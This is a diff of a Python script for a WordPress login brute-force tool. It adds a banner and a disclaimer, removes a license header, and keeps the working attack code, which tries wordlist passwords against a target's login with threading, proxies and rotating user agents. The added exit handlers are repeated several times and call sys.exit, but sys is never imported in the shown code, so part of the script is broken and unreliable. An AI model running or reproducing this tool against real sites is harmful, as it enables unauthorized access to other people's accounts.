@@ -1,31 +1,14 @@
 #!/usr/bin/python
-"""
-WpCrack is a hacking tool used to force login into the CMS WordPress website application.
-Copyright © 2024 Nics <nicoadajar14@gmail.com>
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with this program.  If not, see <http://www.gnu.org/licenses/>.
-"""
 
 import os
 import re
 import ssl
 import time
+import signal
 import random
 import logging
 import urllib.parse
 import urllib.request
-
 from pathlib import Path
 from datetime import datetime
 from argparse import FileType
@@ -34,23 +17,37 @@ from argparse import ArgumentParser
 from concurrent.futures import as_completed
 from concurrent.futures import ThreadPoolExecutor
 
+def signal_handler(signal, frame):
+    print("\nProgram stopped by user\n")
+    sys.exit(0)
 
-NAME = "Admin Panel Bypasser By:Nico Adajar"
-BANNER = """\
-      .---.        .-----------
-     /     \  __  /    ------
-    / /     \(  )/    -----
-   //////   ' \/ `   ---
-  //// / // : ★★ : ---
- // /   /  /`    '--
-//          //..\\   %s
-       ====UU====UU==========================
-           '//||\\`
-             ''``
-""" % (NAME)
-VERSION = "1.1.2" # <major> <minor> <path>
+signal.signal(signal.SIGINT, signal_handler)
 
-""" logger """
+print('\033[31m')
+print('██╗    ██╗██████╗ ███████╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ ')
+print('██║    ██║██╔══██╗██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗')
+print('██║ █╗ ██║██████╔╝█████╗  ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝')
+print('██║███╗██║██╔═══╝ ██╔══╝  ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗')
+print('╚███╔███╔╝██║     ██║     ██║╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║')
+print(' ╚══╝╚══╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ v.1.8')
+print('Coded by: Nics')
+print('Wordpress Brute Force Tool')
+print('\033[0m')
+
+
+
+legal= "Legal Disclaimer:\nThis script is for educational and testing purposes only. Do not use it for illegal activities.\nThe author is not responsible for any misuse or damage caused by this script. Use at your own risk."
+print(legal)
+print("-----------------------------------------------")
+
+
+def signal_handler(signal, frame):
+    print("\nProgram stopped by user\n")
+    sys.exit(0)
+
+
+
+#logger
 LOGGERNAME = Path(__file__).stem
 logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
 log = logging.getLogger(LOGGERNAME)
@@ -93,15 +90,12 @@ userAgent = [
    "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
 ]
 
+def signal_handler(signal, frame):
+    print("\nProgram stopped by user\n")
+    sys.exit(0)
 
-""" print banner """
-def printBanner(start = False):
-   current_time = ""
-   if start is True:
-      current_time = "[*] starting at " + datetime.now().strftime("%H:%M:%S (%d-%m-%Y)")
-   print(BANNER + current_time + "\n\n")
-   
-""" read list """
+#read list
+
 def sliceList(content):
    lists = []
    content = content.readlines()
@@ -109,7 +103,8 @@ def sliceList(content):
       lists.append(line.replace("\n", ""))
    return lists
    
-""" login to target """
+#login to target
+
 def login(url, username, password, timeout, proxy):
     global userAgent
     
@@ -138,15 +133,17 @@ def login(url, username, password, timeout, proxy):
     except Exception as error:
         log.critical(error)
         os._exit(0)
-    
+   
    
 if __name__ == "__main__":
-    """ argument """
+
+#arguments
+
     parser = ArgumentParser(
       usage="python %(prog)s [options]",
-      epilog="Copyright © 2021 Andrew - Powered by Indonesian Darknet",
+      
     )
-    parser.add_argument("-V", "--version", action="version", version=VERSION)
+    
     parser.add_argument("-d", "--debug", action="store_const", const=logging.DEBUG, help="debugging mode")
     target = parser.add_argument_group("target arguments")
     target.add_argument("-t", "--target", dest="url", metavar="", help="url of the target", required=True)
@@ -158,9 +155,7 @@ if __name__ == "__main__":
     request.add_argument("--thread", metavar="", type=int, default=5, help="numbers of threading (default: %(default)s)")
     request.add_argument("--proxy", metavar="", help="using a proxy (ex: 127.0.0.1:8080)")
     args = parser.parse_args()
-    
-    """ print banner firts start """
-    printBanner(True)
+
     
     if args.debug:
         log.setLevel(args.debug)
@@ -201,7 +196,7 @@ if __name__ == "__main__":
                     break
                 
             if success_login is True:
-                log.success("successfully entered into the target dashboard with username \""+args.usr+"\" and password \""+password+"\"")
+                log.success("successfully entered into the target dashboard with username \"\033[32m" + args.usr + "\033[0m\" and password \"\033[32m" + password + "\033[0m\"")
             else:
                 log.failed("cannot enter into the target dashboard")
             
@@ -209,3 +204,7 @@ if __name__ == "__main__":
             
     except Exception as error:
         log.critical(error)
+        
+def signal_handler(signal, frame):
+    print("\nProgram stopped by user\n")
+    sys.exit(0)
